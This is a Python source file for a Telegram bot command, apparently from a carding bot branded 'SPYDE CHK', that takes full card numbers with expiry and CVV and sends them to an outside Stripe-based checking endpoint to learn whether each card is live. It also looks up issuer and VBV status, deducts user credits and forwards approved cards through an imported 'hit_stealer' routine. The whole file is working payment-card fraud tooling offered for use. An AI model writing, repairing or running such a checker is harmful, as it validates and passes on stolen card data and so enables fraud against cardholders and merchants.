import httpx
import time
import asyncio
import json
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# --- ROBUST API CHECK FUNCTION (Updated for new API) ---
async def autostripe_api_check(fullcc: str, session: httpx.AsyncClient) -> dict:
    url = f"https://auto-runp.onrender.com/stripe_npnbet?lista={fullcc}"
    
    try:
        resp = await session.get(url)
        resp.raise_for_status() # Check for HTTP errors like 404/500

        content_type = resp.headers.get("content-type", "").lower()

        if "application/json" in content_type:
            json_resp = resp.json()
            
            # This API seems to use lowercase keys. We will assume it's consistent,
            # but we still wrap it in str() to prevent 'bool has no lower' errors.
            status_raw = str(json_resp.get("status", "Api Down"))
            message = json_resp.get("response", "")
            
        else:
            # Handle plain text responses (e.g., just the word "Declined")
            status_raw = resp.text.strip()
            message = ""

        # Normalize status to match visual styles
        if "approved" in status_raw.lower():
            status = "Approved ✅"
        elif "declined" in status_raw.lower():
            status = "Declined ❌"
        else:
            status = "Api Down"
            
        return {"status": status, "response": message}

    except httpx.HTTPStatusError as e:
        error_message = f"HTTP Error: {e.response.status_code} - {e.response.text[:200]}"
        return {"status": "Api Down", "response": error_message}
    except httpx.RequestError as e:
        error_message = f"Request Error: {str(e)}"
        return {"status": "Api Down", "response": error_message}
    except json.JSONDecodeError:
        # Handle cases where the content-type says JSON but it's not valid
        return {"status": "Api Down", "response": f"Invalid JSON response. Received: {resp.text[:200]}"}
    except Exception as e:
        return {"status": "Api Down", "response": f"An unexpected error occurred: {str(e)}"}

# --- MAIN COMMAND HANDLER (Fixed resource leak) ---
@Client.on_message(filters.command("sk", [".", "/"]))
async def autostripe_cmd(Client, message):
    session = None  # Initialize session to None
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)
        gateway = "Sk based"
        
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        
        if not getcc:
            resp = f"""<b> Gate Name: {gateway} ♻️ CMD: /sk Message: No CC Found in your input ❌ Usage: /sk cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]

        firstresp = f""" ↯ Checking. - 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> - 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i> - 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□ """
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f""" ↯ Checking.. - 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> - 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i> - 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□ """
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        
        # Create the session for the API call
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
        result = await autostripe_api_check(fullcc, session)
        
        getbin = await get_bin_details(cc)
        getresp = {"status": result["status"], "response": result["response"]}
        status_top = getresp["status"]
        status_clean = getresp["response"]

        thirdresp = f""" ↯ Checking... - 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> - 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i> - 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■ """
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        currency = getbin[6] if len(getbin) > 6 else "Unknown"

        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                vbv_data = file.readlines()
                bin_found = False
                for line in vbv_data:
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.split('|')
                    if parts[0] == bin6:
                        bin_found = True
                        vbv_status = parts[2] if len(parts) > 2 else parts[1]
                        break
                if not bin_found:
                    vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
        except FileNotFoundError:
            vbv_status = "VBV BIN file missing"

        proxy_status = "Live ✨"
        elapsed_time = time.perf_counter() - start

        finalresp = f"""
{status_top}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{fullcc}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_clean}
[⟐] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[⟐] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[⟐] B𝗶𝗻 : {bin6}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[⟐] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
━━━━━━━━━━━━━
[⟐] T/t : {elapsed_time:0.2f}s | Proxy : {proxy_status}
[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[⟐] 𝗢𝘄𝗻𝗲𝗿: <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
╚═══════⟐「 𝐒𝐏𝐘𝐃𝐄 𝐂𝐇𝐊  」⟐═══════╝
"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)

        await setantispamtime(user_id)
        await deductcredit(user_id)
        if status_top == "Approved ✅":
            await sendcc(finalresp, session)

        await session.aclose()

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
        
